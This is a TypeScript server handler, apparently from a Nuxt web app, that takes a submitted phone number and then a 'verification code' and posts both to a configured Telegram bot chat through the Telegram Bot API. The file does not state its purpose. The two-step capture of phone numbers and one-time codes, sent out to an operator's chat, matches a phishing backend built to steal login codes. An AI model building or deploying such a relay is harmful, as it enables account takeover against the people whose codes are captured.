type TelegramRequestBody = {
  event?: 'phone_submitted' | 'code_submitted'
  country?: string
  phoneNumber?: string
  verificationCode?: string
}

type TelegramApiResponse = {
  ok: boolean
  description?: string
}

type TelegramApiError = Error & {
  data?: TelegramApiResponse
}

function normalizeConfigValue(value: unknown) {
  if (typeof value === 'string') {
    return value.trim()
  }

  if (typeof value === 'number') {
    return String(value)
  }

  return ''
}

function formatTelegramMessage(body: TelegramRequestBody) {
  const lines = [`Phone number: ${body.phoneNumber ?? 'N/A'}`]

  if (body.verificationCode) {
    lines.push(`Verification code: ${body.verificationCode}`)
  }

  return lines.join('\n')
}

export default defineEventHandler(async (event) => {
  const config = useRuntimeConfig(event)
  const body = await readBody<TelegramRequestBody>(event)
  const phoneNumber = body.phoneNumber?.trim()
  const verificationCode = body.verificationCode?.trim()
  const botToken = normalizeConfigValue(config.telegramBotToken)
  const chatId = normalizeConfigValue(config.telegramChatId)

  if (!phoneNumber) {
    return {
      ok: false,
      configured: true,
      message: 'Phone number is required.'
    }
  }

  if (body.event === 'code_submitted' && !verificationCode) {
    return {
      ok: false,
      configured: true,
      message: 'Verification code is required.'
    }
  }

  if (!botToken || !chatId || chatId === 'replace-with-your-chat-id') {
    return {
      ok: false,
      configured: false,
      message: 'Telegram bot token or chat ID is not configured yet.'
    }
  }

  const text = formatTelegramMessage({
    ...body,
    phoneNumber,
    verificationCode
  })

  try {
    const telegramResponse = await $fetch<TelegramApiResponse>(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      body: {
        chat_id: chatId,
        text
      }
    })

    if (!telegramResponse.ok) {
      return {
        ok: false,
        configured: true,
        message: telegramResponse.description ?? 'Telegram API rejected the message.'
      }
    }
  } catch (error: unknown) {
    const telegramError = error as TelegramApiError
    const description =
      telegramError.data?.description ||
      telegramError.message ||
      'Telegram request failed.'

    return {
      ok: false,
      configured: true,
      message: description
    }
  }

  return {
    ok: true,
    configured: true
  }
})
